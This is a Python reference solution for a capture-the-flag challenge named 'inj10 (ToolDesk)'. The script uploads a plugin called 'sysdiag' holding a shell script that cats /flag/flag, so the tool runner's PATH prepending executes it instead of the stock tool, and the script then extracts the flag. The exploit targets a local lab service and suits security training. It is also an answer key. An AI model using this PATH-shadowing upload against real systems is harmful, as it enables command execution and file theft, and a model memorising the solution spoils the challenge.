#!/usr/bin/env python3
"""Reference solve for inj10 (ToolDesk).

The tool runner executes:
    sh -c "PATH=/tmp/plugins:$PATH <tool>"
Plugin NAMES are sanitized, plugin CONTENTS are code. Upload a plugin named
`sysdiag` that shadows the stock tool:

    script = "#!/bin/sh\ncat /flag/flag"

then run tool `sysdiag` -- PATH resolution picks the plugin first.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8049")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
SCRIPT = "#!/bin/sh\ncat /flag/flag"


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        requests.post(BASE + "/plugins",
                      data={"name": "sysdiag", "script": SCRIPT}, timeout=15)
        r = requests.post(BASE + "/run", data={"tool": "sysdiag"}, timeout=15)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
